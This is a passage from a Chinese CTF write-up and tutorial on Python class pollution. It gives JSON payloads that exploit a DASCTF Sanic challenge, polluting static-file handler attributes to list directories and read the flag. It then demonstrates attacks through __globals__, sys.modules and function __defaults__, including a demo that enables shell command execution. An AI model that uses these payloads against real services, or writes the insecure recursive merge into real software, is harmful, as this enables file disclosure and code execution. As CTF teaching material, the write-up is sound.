class="string">&#x27;|&#x27;</span>+<span class="string">&#x27;value: &#x27;</span>+<span class="built_in">str</span>(value);</span><br><span class="line">        <span class="comment">#生成日志文件</span></span><br><span class="line">        os.system(<span class="string">&quot;mkdir /tmp/&quot;</span>+log_dir)</span><br><span class="line">        <span class="keyword">with</span> <span class="built_in">open</span>(log_file, <span class="string">&#x27;w&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">             f.write(log)</span><br><span class="line">        <span class="comment">#备份日志文件</span></span><br><span class="line">        os.system(<span class="string">&quot;mkdir /tmp/&quot;</span>+log_dir_bak)</span><br><span class="line">        <span class="keyword">with</span> <span class="built_in">open</span>(log_file_bak, <span class="string">&#x27;w&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">             f.write(log)</span><br><span class="line">        <span class="keyword">return</span> text(<span class="string">&quot;！！！此地禁止胡来，你的非法操作已经被记录！！！&quot;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    app.run(host=<span class="string">&#x27;0.0.0.0&#x27;</span>)</span><br></pre></td></tr></table></figure>
<p>​		这儿发现了个可以利用的点，似乎有个可以利用的产生目录穿越的点了，因为生成的 log_dir 变量后面增加了个 <code>..</code>  作为备份：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    log_dir=create_log_dir(<span class="number">6</span>)</span><br><span class="line">    log_dir_bak=log_dir+<span class="string">&quot;..&quot;</span></span><br><span class="line">    log_file=<span class="string">&quot;/tmp/&quot;</span>+log_dir+<span class="string">&quot;/access.log&quot;</span></span><br><span class="line">    log_file_bak=<span class="string">&quot;/tmp/&quot;</span>+log_dir_bak+<span class="string">&quot;/access.log.bak&quot;</span></span><br><span class="line">    log=<span class="string">&#x27;key: &#x27;</span>+<span class="built_in">str</span>(key)+<span class="string">&#x27;|&#x27;</span>+<span class="string">&#x27;value: &#x27;</span>+<span class="built_in">str</span>(value);</span><br><span class="line">    <span class="comment">#生成日志文件</span></span><br><span class="line">    os.system(<span class="string">&quot;mkdir /tmp/&quot;</span>+log_dir)</span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(log_file, <span class="string">&#x27;w&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">         f.write(log)</span><br><span class="line">    <span class="comment">#备份日志文件</span></span><br><span class="line">    os.system(<span class="string">&quot;mkdir /tmp/&quot;</span>+log_dir_bak)</span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(log_file_bak, <span class="string">&#x27;w&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">         f.write(log)</span><br><span class="line">    <span class="keyword">return</span> text(<span class="string">&quot;！！！此地禁止胡来，你的非法操作已经被记录！！！&quot;</span>)</span><br></pre></td></tr></table></figure>
<p>​		不过先访问下机密路由 <code>Wa58a1qEQ59857qQRPPQ</code> ：</p>
<figure class="highlight tex"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">flag in /app,but you need to find his name！！！</span><br><span class="line">Find a way to see the file names in the app directory</span><br></pre></td></tr></table></figure>
<p>​		提示很明显了，flag 在 /app 文件夹内。</p>
<p>​		这里似乎有个没用到的看起来很重要的点，先提前随便进行一次个不能成功的污染，比如 key 中存在 parts 字符串。之后访问下这个 <code>adminLook</code>  路由试试:</p>
<figure class="highlight tex"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">total 0</span><br><span class="line">drwxrwxrwt 1 root root 57 Jul 21 23:04 .</span><br><span class="line">drwxr-xr-x 1 root root 43 Jul 21 22:49 ..</span><br><span class="line">drwxr-xr-x 2 root root 24 Jul 21 23:04 73ycOr</span><br><span class="line">drwxr-xr-x 2 root root 28 Jul 21 23:04 73ycOr..</span><br><span class="line">drwx------ 2 root root 31 Jul 21 22:49 pymp-zra4pxem</span><br></pre></td></tr></table></figure>
<p>​		可以看到，成功产生了一个结尾两个点的目录，之后就是污染 base 属性进行目录穿越了，payload 如下：</p>
<figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">#先切换到/tep目录下</span><br><span class="line"><span class="punctuation">&#123;</span><span class="attr">&quot;key&quot;</span><span class="punctuation">:</span><span class="string">&quot;__class__\\\\.__init__\\\\.__globals__\\\\.app.router.name_index.__mp_main__\\.static.handler.keywords.file_or_directory&quot;</span><span class="punctuation">,</span><span class="attr">&quot;value&quot;</span><span class="punctuation">:</span> <span class="string">&quot;/tmp&quot;</span><span class="punctuation">&#125;</span></span><br><span class="line"></span><br><span class="line">#对base属性进行污染</span><br><span class="line"><span class="punctuation">&#123;</span><span class="attr">&quot;key&quot;</span><span class="punctuation">:</span><span class="string">&quot;__class__\\\\.__init__\\\\.__globals__\\\\.app.router.name_index.__mp_main__\\.static.handler.keywords.directory_handler.base&quot;</span><span class="punctuation">,</span><span class="attr">&quot;value&quot;</span><span class="punctuation">:</span> <span class="string">&quot;static/73ycOr&quot;</span><span class="punctuation">&#125;</span></span><br><span class="line"></span><br><span class="line">#打开目录功能</span><br><span class="line"><span class="punctuation">&#123;</span><span class="attr">&quot;key&quot;</span><span class="punctuation">:</span><span class="string">&quot;__class__\\\\.__init__\\\\.__globals__\\\\.app.router.name_index.__mp_main__\\.static.handler.keywords.directory_handler.directory_view&quot;</span><span class="punctuation">,</span><span class="attr">&quot;value&quot;</span><span class="punctuation">:</span> <span class="number">1</span><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure>
<p>​		然后访问 <code>/static/73ycOr../</code>  找到了 flag 文件的文件名： <code>45W698WqtsgQT1_flag</code> 。</p>
<p>​		之后污染静态文件目录为根目录，然后访问 <code>/static/app/45W698WqtsgQT1_flag</code>  即可：</p>
<figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span><span class="attr">&quot;key&quot;</span><span class="punctuation">:</span><span class="string">&quot;__class__\\\\.__init__\\\\.__globals__\\\\.app.router.name_index.__mp_main__\\.static.handler.keywords.file_or_directory&quot;</span><span class="punctuation">,</span><span class="attr">&quot;value&quot;</span><span class="punctuation">:</span> <span class="string">&quot;/&quot;</span><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure>
<p>​		flag: <code>DASCTF&#123;8543c470-d4aa-4668-b051-43ed5c9517b1&#125;</code></p>
<h1 id="python原型链污染变体跟随article_kelp学"><a class="markdownIt-Anchor" href="#python原型链污染变体跟随article_kelp学">#</a> Python 原型链污染变体 (跟随 Article_kelp 学)</h1>
<p>​		前面的基础已经说过了，这里就跳过了，具体可以看看之前的 merge 函数方面的内容。</p>
<h2 id="1-更广泛的获取"><a class="markdownIt-Anchor" href="#1-更广泛的获取">#</a> 1、更广泛的获取：</h2>
<p>​		污染类属性是可以通过示例的 <code>__base__</code> 属性查找到其继承的父类，但是如果目标类与切入点类或实例没有继承关系时，这种方法就显得十分无力，代码在上面也早已给出来了。</p>
<h2 id="2-全局变量的获取"><a class="markdownIt-Anchor" href="#2-全局变量的获取">#</a> 2、全局变量的获取：</h2>
<p>​		在 <code>Python</code>  中，函数或类方法（对于类的内置方法如 <code>__init__</code> 这些来说，内置方法在并未重写时其数据类型为装饰器即 <code>wrapper_descriptor</code> ，只有在重写后才是函数 <code>function</code> ）均具有一个 <code>__globals__</code> 属性，该属性将函数或类方法所申明的变量空间中的全局变量以字典的形式返回（相当于这个变量空间中的 <code>globals</code>  函数的返回值</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line">secret_var = <span class="number">114</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">test</span>():</span><br><span class="line">    <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">a</span>:</span><br><span class="line">    secret_class_var = <span class="string">&quot;secret&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">b</span>:</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">merge</span>(<span class="params">src, dst</span>):</span><br><span class="line">    <span class="comment"># Recursive merge function</span></span><br><span class="line">    <span class="keyword">for</span> k, v <span class="keyword">in</span> src.items():</span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">hasattr</span>(dst, <span class="string">&#x27;__getitem__&#x27;</span>):</span><br><span class="line">            <span class="keyword">if</span> dst.get(k) <span class="keyword">and</span> <span class="built_in">type</span>(v) == <span class="built_in">dict</span>:</span><br><span class="line">                merge(v, dst.get(k))</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                dst[k] = v</span><br><span class="line">        <span class="keyword">elif</span> <span class="built_in">hasattr</span>(dst, k) <span class="keyword">and</span> <span class="built_in">type</span>(v) == <span class="built_in">dict</span>:</span><br><span class="line">            merge(v, <span class="built_in">getattr</span>(dst, k))</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="built_in">setattr</span>(dst, k, v)</span><br><span class="line"></span><br><span class="line">instance = b()</span><br><span class="line"></span><br><span class="line">payload = &#123;</span><br><span class="line">    <span class="string">&quot;__init__&quot;</span> : &#123;</span><br><span class="line">            <span class="string">&quot;__globals__&quot;</span> : &#123;</span><br><span class="line">                <span class="string">&quot;secret_var&quot;</span> : <span class="number">514</span>,</span><br><span class="line">                <span class="string">&quot;a&quot;</span> : &#123;</span><br><span class="line">                    <span class="string">&quot;secret_class_var&quot;</span> : <span class="string">&quot;Pooooluted ~&quot;</span></span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(a.secret_class_var)</span><br><span class="line"><span class="comment">#secret</span></span><br><span class="line"><span class="built_in">print</span>(secret_var)</span><br><span class="line"><span class="comment">#114</span></span><br><span class="line">merge(payload, instance)</span><br><span class="line"><span class="built_in">print</span>(a.secret_class_var)</span><br><span class="line"><span class="comment">#Pooooluted ~</span></span><br><span class="line"><span class="built_in">print</span>(secret_var)</span><br><span class="line"><span class="comment">#514</span></span><br></pre></td></tr></table></figure>
<h2 id="3-已加载模块获取"><a class="markdownIt-Anchor" href="#3-已加载模块获取">#</a> 3、已加载模块获取：</h2>
<p>​		局限于当前模块的全局变量获取显然不够，很多情况下需要对并不是定义在入口文件中的类对象或者属性，而我们的操作位置又在入口文件中，这个时候就需要对其他加载过的模块来获取了</p>
<h3 id="加载关系简单"><a class="markdownIt-Anchor" href="#加载关系简单">#</a> 加载关系简单：</h3>
<p>​		在加载关系简单的情况下，我们可以直接从文件的 <code>import</code>  语法部分找到目标模块，这个时候我们就可以通过获取全局变量来得到目标模块。</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#test.py</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> test_1</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">cls</span>:</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">merge</span>(<span class="params">src, dst</span>):</span><br><span class="line">    <span class="comment"># Recursive merge function</span></span><br><span class="line">    <span class="keyword">for</span> k, v <span class="keyword">in</span> src.items():</span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">hasattr</span>(dst, <span class="string">&#x27;__getitem__&#x27;</span>):</span><br><span class="line">            <span class="keyword">if</span> dst.get(k) <span class="keyword">and</span> <span class="built_in">type</span>(v) == <span class="built_in">dict</span>:</span><br><span class="line">                merge(v, dst.get(k))</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                dst[k] = v</span><br><span class="line">        <span class="keyword">elif</span> <span class="built_in">hasattr</span>(dst, k) <span class="keyword">and</span> <span class="built_in">type</span>(v) == <span class="built_in">dict</span>:</span><br><span class="line">            merge(v, <span class="built_in">getattr</span>(dst, k))</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="built_in">setattr</span>(dst, k, v)</span><br><span class="line"></span><br><span class="line">instance = cls()</span><br><span class="line"></span><br><span class="line">payload = &#123;</span><br><span class="line">    <span class="string">&quot;__init__&quot;</span> : &#123;</span><br><span class="line">        <span class="string">&quot;__globals__&quot;</span> : &#123;</span><br><span class="line">            <span class="string">&quot;test_1&quot;</span> : &#123;</span><br><span class="line">                <span class="string">&quot;secret_var&quot;</span> : <span class="number">514</span>,</span><br><span class="line">                <span class="string">&quot;target_class&quot;</span> : &#123;</span><br><span class="line">                    <span class="string">&quot;secret_class_var&quot;</span> : <span class="string">&quot;Poluuuuuuted ~&quot;</span></span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(test_1.secret_var)</span><br><span class="line"><span class="comment">#secret</span></span><br><span class="line"><span class="built_in">print</span>(test_1.target_class.secret_class_var)</span><br><span class="line"><span class="comment">#114</span></span><br><span class="line">merge(payload, instance)</span><br><span class="line"><span class="built_in">print</span>(test_1.secret_var)</span><br><span class="line"><span class="comment">#514</span></span><br><span class="line"><span class="built_in">print</span>(test_1.target_class.secret_class_var)</span><br><span class="line"><span class="comment">#Poluuuuuuted ~</span></span><br></pre></td></tr></table></figure>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#test_1.py</span></span><br><span class="line"></span><br><span class="line">secret_var = <span class="number">114</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">target_class</span>:</span><br><span class="line">    secret_class_var = <span class="string">&quot;secret&quot;</span></span><br></pre></td></tr></table></figure>
<h3 id="加载关系复杂示例"><a class="markdownIt-Anchor" href="#加载关系复杂示例">#</a> 加载关系复杂–示例：</h3>
<p>​		如 <code>CTF</code>  题目等实际环境中往往是多层模块导入，甚至是存在于内置模块或三方模块中导入，这个时候通过直接看代码文件中 <code>import</code>  语法查找就十分困难，而解决方法则是利用 <code>sys</code>  模块</p>
<p>​		 <code>sys</code>  模块的 <code>modules</code>  属性以字典的形式包含了程序自开始运行时所有已加载过的模块，可以直接从该属性中获取到目标模块.`</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#test.py</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> test_1</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">cls</span>:</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">merge</span>(<span class="params">src, dst</span>):</span><br><span class="line">    <span class="comment"># Recursive merge function</span></span><br><span class="line">    <span class="keyword">for</span> k, v <span class="keyword">in</span> src.items():</span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">hasattr</span>(dst, <span class="string">&#x27;__getitem__&#x27;</span>):</span><br><span class="line">            <span class="keyword">if</span> dst.get(k) <span class="keyword">and</span> <span class="built_in">type</span>(v) == <span class="built_in">dict</span>:</span><br><span class="line">                merge(v, dst.get(k))</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                dst[k] = v</span><br><span class="line">        <span class="keyword">elif</span> <span class="built_in">hasattr</span>(dst, k) <span class="keyword">and</span> <span class="built_in">type</span>(v) == <span class="built_in">dict</span>:</span><br><span class="line">            merge(v, <span class="built_in">getattr</span>(dst, k))</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="built_in">setattr</span>(dst, k, v)</span><br><span class="line"></span><br><span class="line">instance = cls()</span><br><span class="line"></span><br><span class="line">payload = &#123;</span><br><span class="line">    <span class="string">&quot;__init__&quot;</span> : &#123;</span><br><span class="line">        <span class="string">&quot;__globals__&quot;</span> : &#123;</span><br><span class="line">            <span class="string">&quot;sys&quot;</span> : &#123;</span><br><span class="line">                <span class="string">&quot;modules&quot;</span> : &#123;</span><br><span class="line">                    <span class="string">&quot;test_1&quot;</span> : &#123;</span><br><span class="line">                        <span class="string">&quot;secret_var&quot;</span> : <span class="number">514</span>,</span><br><span class="line">                        <span class="string">&quot;target_class&quot;</span> : &#123;</span><br><span class="line">                            <span class="string">&quot;secret_class_var&quot;</span> : <span class="string">&quot;Poluuuuuuted ~&quot;</span></span><br><span class="line">                        &#125;</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(test_1.secret_var)</span><br><span class="line"><span class="comment">#secret</span></span><br><span class="line"><span class="built_in">print</span>(test_1.target_class.secret_class_var)</span><br><span class="line"><span class="comment">#114</span></span><br><span class="line">merge(payload, instance)</span><br><span class="line"><span class="built_in">print</span>(test_1.secret_var)</span><br><span class="line"><span class="comment">#514</span></span><br><span class="line"><span class="built_in">print</span>(test_1.target_class.secret_class_var)</span><br><span class="line"><span class="comment">#Poluuuuuuted ~</span></span><br></pre></td></tr></table></figure>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#test_1.py</span></span><br><span class="line"></span><br><span class="line">secret_var = <span class="number">114</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">target_class</span>:</span><br><span class="line">    secret_class_var = <span class="string">&quot;secret&quot;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>​		当然我们去使用的 <code>Payload</code>  绝大部分情况下是不会这样的，如上的 <code>Payload</code>  实际上是在已经 <code>import sys</code>  的情况下使用的，而大部分情况是没有直接导入的，这样问题就从<strong>寻找 <code>import</code>  特定模块的语句</strong>转换为<strong>寻找 <code>import</code>  了 sys 模块的语句</strong>，对问题解决的并不见得有多少优化</p>
<h2 id="4-函数形参默认值替换"><a class="markdownIt-Anchor" href="#4-函数形参默认值替换">#</a> 4、函数形参默认值替换：</h2>
<p>​		主要用到了函数的 <code>__defaults__</code> 和 <code>__kwdefaults__</code> 这两个内置属性</p>
<h4 id="__defaults__"><a class="markdownIt-Anchor" href="#__defaults__">#</a>  <code>__defaults__</code> ：</h4>
<p>​		 <code>__defaults__</code> 以元组的形式按从左到右的顺序收录了函数的位置或键值形参的默认值，需要注意这个位置或键值形参是特定的一类形参，并不是位置形参 + 键值形参，关于函数的参数分类可以参考这篇文章：<span class="exturl" data-url="aHR0cHM6Ly96aHVhbmxhbi56aGlodS5jb20vcC80MTIyNzM0NjU=">python 函数的位置参数 (Positional) 和关键字参数 (keyword) - 知乎 (zhihu.com)</span></p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">func_a</span>(<span class="params">var_1, var_2 =<span class="number">2</span>, var_3 = <span class="number">3</span></span>):</span><br><span class="line">    <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">func_b</span>(<span class="params">var_1, /, var_2 =<span class="number">2</span>, var_3 = <span class="number">3</span></span>):</span><br><span class="line">    <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">func_c</span>(<span class="params">var_1, var_2 =<span class="number">2</span>, *, var_3 = <span class="number">3</span></span>):</span><br><span class="line">    <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">func_d</span>(<span class="params">var_1, /, var_2 =<span class="number">2</span>, *, var_3 = <span class="number">3</span></span>):</span><br><span class="line">    <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(func_a.__defaults__)</span><br><span class="line"><span class="comment">#(2, 3)</span></span><br><span class="line"><span class="built_in">print</span>(func_b.__defaults__)</span><br><span class="line"><span class="comment">#(2, 3)</span></span><br><span class="line"><span class="built_in">print</span>(func_c.__defaults__)</span><br><span class="line"><span class="comment">#(2,)</span></span><br><span class="line"><span class="built_in">print</span>(func_d.__defaults__)</span><br><span class="line"><span class="comment">#(2,)</span></span><br></pre></td></tr></table></figure>
<p>​		通过替换该属性便能实现对函数位置或键值形参的默认值替换，但稍有问题的是该属性值要求为元组类型，而通常的如 <code>JSON</code>  等格式并没有元组这一数据类型设计概念，这就需要环境中有合适的解析输入的方式</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">evilFunc</span>(<span class="params">arg_1 , shell = <span class="literal">False</span></span>):</span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> shell:</span><br><span class="line">        <span class="built_in">print</span>(arg_1)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="built_in">__import__</span>(<span class="string">&quot;os&quot;</span>).popen(arg_1).read())</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">cls</span>:</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">merge</span>(<span class="params">src, dst</span>):</span><br><span class="line">    <span class="comment"># Recursive merge function</span></span><br><span class="line">    <span class="keyword">for</span> k, v <span class="keyword">in</span> src.items():</span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">hasattr</span>(dst, <span class="string">&#x27;__getitem__&#x27;</span>):</span><br><span class="line">            <span class="keyword">if</span> dst.get(k) <span class="keyword">and</span> <span class="built_in">type</span>(v) == <span class="built_in">dict</span>:</span><br><span class="line">                merge(v, dst.get(k))</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                dst[k] = v</span><br><span class="line">        <span class="keyword">elif</span> <span class="built_in">hasattr</span>(dst, k) <span class="keyword">and</span> <span class="built_in">type</span>(v) == <span class="built_in">dict</span>:</span><br><span class="line">            merge(v, <span class="built_in">getattr</span>(dst, k))</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="built_in">setattr</span>(dst, k, v)</span><br><span class="line"></span><br><span class="line">instance = cls()</span><br><span class="line"></span><br><span class="line">payload = &#123;</span><br><span class="line">    <span class="string">&quot;__init__&quot;</span> : &#123;</span><br><span class="line">        <span class="string">&quot;__globals__&quot;</span> : &#123;</span><br><span class="line">            <span class="string">&quot;evilFunc&quot;</span> : &#123;</span><br><span class="line">                <span class="string">&quot;__defaults__&quot;</span> : (</span><br><span class="line">                    <span class="literal">True</span> ,</span><br><span class="line">                )</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">evilFunc(<span class="string">&quot;whoami&quot;</span>)</span><br><span class="line"><span class="comment">#whoami</span></span><br><span class="line">merge(payload, instance)</span><br><span class="line">evilFunc(<span class="string">&quot;whoami&quot;</span>)</span><br><span class="line"><span class="comment">#article-kelp</span></span><br></pre></td></tr></table></figure>
<h3 id="__kwdefaults__"><a class="markdownIt-Anchor" href="#__kwdefaults__">#</a>  <code>__kwdefaults__</code></h3>
<p>​		 <code>__kwdefaults__</code> 以字典的形式按从左到右的顺序收录了函数键值形参的默认值，从代码上来看，则是如下的效果：</p>
